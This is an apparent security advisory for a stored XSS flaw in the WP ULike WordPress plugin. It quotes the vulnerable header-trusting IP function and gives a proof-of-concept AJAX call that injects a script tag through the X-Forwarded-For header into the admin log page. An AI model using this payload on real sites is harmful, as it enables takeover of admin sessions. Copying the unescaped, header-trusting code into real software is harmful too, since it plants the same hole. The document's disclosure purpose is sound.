author: Tom Adams
cves: 

Details
================
Software: WP ULike
Version: 2.8.1,3.1
Homepage: https://wordpress.org/plugins/wp-ulike/
Advisory report: https://advisories.dxw.com/advisories/stored-xss-wp-ulike/
CVE: Awaiting assignment
CVSS: 6.4 (Medium; AV:N/AC:L/Au:N/C:P/I:P/A:N)

Description
================
Stored XSS in WP ULike allows unauthorised users to do almost anything an admin can

Vulnerability
================
The pluginas default configuration (after pressing aSave Changesa on the settings page) allows unauthenticated users to alikea posts. It fetches the useras IP like this:
        function wp_ulike_get_real_ip() {
                if (getenv(\'HTTP_CLIENT_IP\')) {
                        $ip = getenv(\'HTTP_CLIENT_IP\');
                } elseif (getenv(\'HTTP_X_FORWARDED_FOR\')) {
                        $ip = getenv(\'HTTP_X_FORWARDED_FOR\');
                } elseif (getenv(\'HTTP_X_FORWARDED\')) {
                        $ip = getenv(\'HTTP_X_FORWARDED\');
                } elseif (getenv(\'HTTP_FORWARDED_FOR\')) {
                        $ip = getenv(\'HTTP_FORWARDED_FOR\');
                } elseif (getenv(\'HTTP_FORWARDED\')) {
                        $ip = getenv(\'HTTP_FORWARDED\');
                } else {
                        $ip = $_SERVER[\'REMOTE_ADDR\'];
                }

                return $ip;
        }
This will be incorrect in many situations. The header (which could be an IP address, or it could be an arbitrary string provided by the user) is stored in the database. Then itas displayed to the admin without being escaped.

Proof of concept
================

Enable the plugin
Visit /wp-admin/admin.php?page=wp-ulike-settings and press Save Settings
Sign out
Visit a post displaying a like button
Open the console
Paste and execute this: var d=document.querySelector(\'.wpulike-default a\').dataset;jQuery.ajax(\'/wp-admin/admin-ajax.php\', {method: \'POST\', headers: {\'X-Forwarded-For\': \'<script>alert(1)</script>\'},data: {action: \'wp_ulike_process\', id: d.ulikeId, status: d.ulikeStatus, type: d.ulikeType, nonce: d.ulikeNonce}})
Sign in
Visit /wp-admin/admin.php?page=wp-ulike-post-logs


Mitigations
================
Upgrade to version 3.2 or later.
